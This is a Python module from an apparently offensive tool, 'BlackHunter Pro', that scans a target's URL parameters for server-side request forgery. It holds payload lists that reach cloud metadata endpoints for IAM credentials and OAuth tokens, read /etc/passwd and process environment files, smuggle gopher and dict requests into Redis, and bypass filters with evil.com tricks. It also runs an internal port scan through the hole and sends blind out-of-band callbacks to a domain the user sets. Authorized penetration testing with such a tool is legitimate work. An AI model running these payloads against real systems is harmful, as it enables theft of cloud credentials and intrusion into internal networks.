# vulns/ssrf.py
# BlackHunter Pro - SSRF Scanner
# Detects: Server-Side Request Forgery (Basic, Blind, Cloud Metadata)

import re
import time
import uuid
import requests
from urllib.parse import urlparse, urljoin, parse_qs, quote
from colorama import Fore, Style

import warnings
warnings.filterwarnings("ignore")


class SSRFScanner:
    """
    Server-Side Request Forgery Scanner
    - Basic SSRF detection
    - Internal network scanning
    - Cloud metadata access (AWS, GCP, Azure)
    - Protocol smuggling (gopher, dict, file)
    - Blind SSRF detection (OOB)
    - Filter bypass techniques
    """

    # =============================================
    # SSRF PAYLOADS
    # =============================================

    LOCALHOST = [
        'http://127.0.0.1/', 'http://127.0.0.1:80/',
        'http://127.0.0.1:443/', 'http://127.0.0.1:22/',
        'http://127.0.0.1:3306/', 'http://127.0.0.1:6379/',
        'http://127.0.0.1:8080/', 'http://127.0.0.1:8443/',
        'http://localhost/', 'http://localhost:80/',
        'http://localhost:8080/', 'http://localhost:9200/',
        'http://[::1]/', 'http://0.0.0.0/',
        'http://127.1/', 'http://127.0.1/',
        'http://127.0.0.1.nip.io/', 'http://localtest.me/',
    ]

    CLOUD_METADATA = [
        # AWS
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'http://169.254.169.254/latest/user-data/',
        'http://169.254.169.254/latest/meta-data/hostname',
        'http://169.254.169.254/latest/meta-data/local-ipv4',
        'http://169.254.169.254/latest/dynamic/instance-identity/document',
        # GCP
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
        'http://169.254.169.254/computeMetadata/v1/',
        # Azure
        'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
        'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
        # DigitalOcean
        'http://169.254.169.254/metadata/v1/',
        # Alibaba
        'http://100.100.100.200/latest/meta-data/',
        # Oracle
        'http://169.254.169.254/opc/v1/instance/',
    ]

    INTERNAL_NETWORK = [
        'http://192.168.0.1/', 'http://192.168.1.1/',
        'http://192.168.1.254/', 'http://10.0.0.1/',
        'http://10.0.0.138/', 'http://172.16.0.1/',
        'http://172.16.1.1/', 'http://172.17.0.1/',
        'http://172.31.0.1/', 'http://10.96.0.1/',
    ]

    PROTOCOLS = [
        'file:///etc/passwd',
        'file:///etc/hosts',
        'file:///c:/windows/win.ini',
        'file:///proc/self/environ',
        'gopher://127.0.0.1:6379/_INFO',
        'gopher://127.0.0.1:6379/_PING',
        'dict://127.0.0.1:6379/INFO',
        'dict://127.0.0.1:11211/stats',
        'ftp://127.0.0.1:21/',
        'ldap://127.0.0.1:389/',
        'tftp://127.0.0.1:69/',
    ]

    BYPASSES = [
        'http://127.1/', 'http://127.0.1/',
        'http://0177.0.0.1/', 'http://0x7f.0.0.1/',
        'http://0x7f000001/', 'http://2130706433/',
        'http://127.0.0.1%00.evil.com/',
        'http://127.0.0.1#@evil.com/',
        'http://evil.com@127.0.0.1/',
        'http://127%2e0%2e0%2e1/',
        'http://%31%32%37%2e%30%2e%30%2e%31/',
    ]

    # =============================================
    # SUCCESS INDICATORS
    # =============================================

    SUCCESS_INDICATORS = [
        'root:x:0:0', 'ami-', 'accesskeyid', 'secretaccesskey',
        'security-credentials', 'instance-id', 'local-hostname',
        'computeMetadata', 'service-accounts', 'azure', 'subscriptionid',
        'redis_version', '+OK', '+PONG', 'redis_mode',
        '[extensions]', '[fonts]', 'localhost', 'apache', 'nginx',
        'DOCUMENT_ROOT', 'HTTP_USER_AGENT',
    ]

    # =============================================
    # SSRF-PRONE PARAMETERS
    # =============================================

    SSRF_PARAMS = [
        'url', 'uri', 'link', 'src', 'source', 'target', 'dest', 'destination',
        'redirect', 'redirect_url', 'redirect_uri', 'return', 'return_url',
        'next', 'next_url', 'callback', 'callback_url', 'continue', 'continue_url',
        'file', 'file_url', 'filename', 'path', 'path_url', 'load', 'load_url',
        'fetch', 'fetch_url', 'get', 'get_url', 'read', 'read_url',
        'page', 'page_url', 'view', 'view_url', 'site', 'site_url',
        'image', 'image_url', 'img', 'img_url', 'avatar', 'avatar_url',
        'proxy', 'proxy_url', 'host', 'host_url', 'domain', 'domain_url',
        'api', 'api_url', 'service', 'service_url', 'endpoint', 'endpoint_url',
        'webhook', 'webhook_url', 'feed', 'feed_url', 'rss', 'rss_url',
    ]

    # =============================================
    # INITIALIZATION
    # =============================================

    def __init__(self, target, timeout=10, user_agent=None):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': user_agent or 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
        })
        self.session.verify = False

        self.vulnerabilities = []
        self.callback_domain = None
        self._baseline = {}

    # =============================================
    # SET CALLBACK
    # =============================================

    def set_callback(self, domain):
        """Set callback domain for blind SSRF"""
        self.callback_domain = domain
        print(f"{Fore.GREEN}[+] Callback: {domain}")

    # =============================================
    # MAIN RUN
    # =============================================

    def run(self):
        """Execute SSRF detection"""
        print(f"{Fore.CYAN}[*] SSRF Scanner started")
        print(f"{Fore.CYAN}[*] Target: {self.target}")
        print()

        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)

        if not params:
            params = self._find_form_params()

        if not params:
            print(f"{Fore.YELLOW}  [-] No parameters found")
            return []

        ssrf_params = {k: v for k, v in params.items()
                       if any(name in k.lower() for name in self.SSRF_PARAMS)}

        if not ssrf_params:
            ssrf_params = params

        print(f"{Fore.CYAN}[*] Testing {len(ssrf_params)} parameters: {', '.join(ssrf_params.keys())}")
        print()

        self._get_baseline()

        for param in ssrf_params.keys():
            print(f"{Fore.YELLOW}[*] Testing parameter: {param}")
            self._test_parameter(param)

        return self.vulnerabilities

    # =============================================
    # FIND FORM PARAMS
    # =============================================

    def _find_form_params(self):
        """Find parameters from forms"""
        params = {}
        try:
            r = self.session.get(self.target, timeout=self.timeout, verify=False)
            forms = re.findall(r'<form[^>]*>.*?</form>', r.text, re.IGNORECASE | re.DOTALL)

            for form in forms:
                inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', form, re.IGNORECASE)
                for inp in inputs:
                    params[inp] = '1'
        except:
            pass
        return params

    # =============================================
    # BASELINE
    # =============================================

    def _get_baseline(self):
        """Get baseline response"""
        try:
            r = self.session.get(self.target, timeout=self.timeout, verify=False)
            self._baseline = {
                'length': len(r.text),
                'content': r.text[:1000],
            }
        except:
            self._baseline = {'length': 0, 'content': ''}

    # =============================================
    # TEST PARAMETER
    # =============================================

    def _test_parameter(self, param):
        """Test single parameter"""

        # 1. Localhost
        if self._test_category(param, self.LOCALHOST, 'Localhost'):
            return

        # 2. Cloud metadata
        if self._test_category(param, self.CLOUD_METADATA, 'Cloud Metadata'):
            return

        # 3. Internal network
        if self._test_category(param, self.INTERNAL_NETWORK, 'Internal Network'):
            return

        # 4. Protocols
        if self._test_category(param, self.PROTOCOLS, 'Protocol Smuggling'):
            return

        # 5. Bypasses
        if self._test_category(param, self.BYPASSES, 'Filter Bypass'):
            return

    # =============================================
    # TEST CATEGORY
    # =============================================

    def _test_category(self, param, payloads, category):
        """Test a category of payloads"""
        parsed = urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)

        for payload in payloads:
            try:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param] = payload

                r = self.session.get(
                    base_url, params=test_params,
                    timeout=self.timeout, allow_redirects=False, verify=False
                )

                evidence = self._check_ssrf(r, payload)

                if evidence:
                    severity = 'CRITICAL' if category in ['Cloud Metadata', 'Protocol Smuggling'] else 'HIGH'

                    print(f"{Fore.RED}  [!] SSRF Found ({category})")
                    print(f"{Fore.RED}      Param: {param}")
                    print(f"{Fore.RED}      Payload: {payload}")
                    print(f"{Fore.RED}      Evidence: {evidence[:60]}")

                    self.vulnerabilities.append({
                        'type': f'SSRF ({category})',
                        'url': r.url,
                        'param': param,
                        'payload': payload,
                        'category': category,
                        'evidence': evidence[:500],
                        'severity': severity,
                    })
                    return True

            except requests.Timeout:
                if category in ['Localhost', 'Internal Network']:
                    print(f"{Fore.YELLOW}  [!] Possible SSRF (Timeout) - {category}")
                    print(f"{Fore.YELLOW}      Param: {param}")
                    print(f"{Fore.YELLOW}      Payload: {payload}")

                    self.vulnerabilities.append({
                        'type': f'SSRF (Blind - {category})',
                        'url': self.target,
                        'param': param,
                        'payload': payload,
                        'evidence': 'Request timeout',
                        'severity': 'HIGH',
                    })
                    return True
            except:
                continue

        return False

    # =============================================
    # SSRF CHECK
    # =============================================

    def _check_ssrf(self, response, payload):
        """Check response for SSRF indicators"""
        text = response.text.lower()
        original = self._baseline['content'].lower()

        for indicator in self.SUCCESS_INDICATORS:
            if indicator.lower() in text:
                if indicator.lower() not in original:
                    return indicator

        if payload.startswith('file://'):
            if 'root:x:0:0' in text or '[extensions]' in text:
                return 'File content leaked'

        location = response.headers.get('Location', '')
        if '127.0.0.1' in location or 'localhost' in location or '169.254' in location:
            return f'Redirect to internal: {location}'

        if abs(len(response.text) - self._baseline['length']) > 100:
            if payload.startswith(('http://127', 'http://localhost', 'http://169.254')):
                return 'Response changed significantly'

        return None

    # =============================================
    # BLIND SSRF (OOB)
    # =============================================

    def test_blind(self, param):
        """Test blind SSRF via callback"""
        if not self.callback_domain:
            print(f"{Fore.YELLOW}  [!] No callback domain set")
            return False

        parsed = urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)

        payloads = [
            'http://{token}.{callback}/',
            'https://{token}.{callback}/',
            '//{token}.{callback}/',
            'http://{callback}/{token}',
        ]

        for payload_template in payloads:
            token = uuid.uuid4().hex[:12]
            payload = payload_template.format(token=token, callback=self.callback_domain)

            try:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param] = payload

                self.session.get(base_url, params=test_params, timeout=self.timeout, verify=False)

                print(f"{Fore.YELLOW}  [*] Blind SSRF test sent: {token}")

                self.vulnerabilities.append({
                    'type': 'SSRF (Blind)',
                    'url': self.target,
                    'param': param,
                    'payload': payload,
                    'token': token,
                    'callback': f"{token}.{self.callback_domain}",
                    'verified': False,
                    'severity': 'HIGH',
                })
            except:
                continue

        return True

    # =============================================
    # INTERNAL PORT SCAN
    # =============================================

    def scan_internal_ports(self, param):
        """Scan internal ports via SSRF"""
        parsed = urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)

        ports = [22, 25, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 11211, 27017]
        open_ports = []

        print(f"{Fore.CYAN}[*] Scanning internal ports...")

        for port in ports:
            payload = f"http://127.0.0.1:{port}/"

            try:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param] = payload

                start = time.time()
                r = self.session.get(base_url, params=test_params, timeout=self.timeout, verify=False)
                elapsed = time.time() - start

                if elapsed < 3 and r.status_code in [200, 400, 401, 403]:
                    open_ports.append(port)
                    print(f"{Fore.GREEN}    [+] Port {port} open ({elapsed:.2f}s)")
            except:
                pass

        if open_ports:
            self.vulnerabilities.append({
                'type': 'SSRF (Internal Port Scan)',
                'url': self.target,
                'param': param,
                'open_ports': open_ports,
                'severity': 'HIGH',
            })

        return open_ports

    # =============================================
    # SUMMARY
    # =============================================

    def summary(self):
        """Print summary"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}  SSRF SUMMARY")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Vulnerabilities: {len(self.vulnerabilities)}")

        categories = {}
        for v in self.vulnerabilities:
            cat = v.get('category', v.get('type', 'Unknown'))
            categories[cat] = categories.get(cat, 0) + 1

        for cat, count in categories.items():
            print(f"{Fore.RED}[!] {cat}: {count}")

        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")


# =============================================
# EXPORTS
# =============================================

__all__ = ["SSRFScanner"]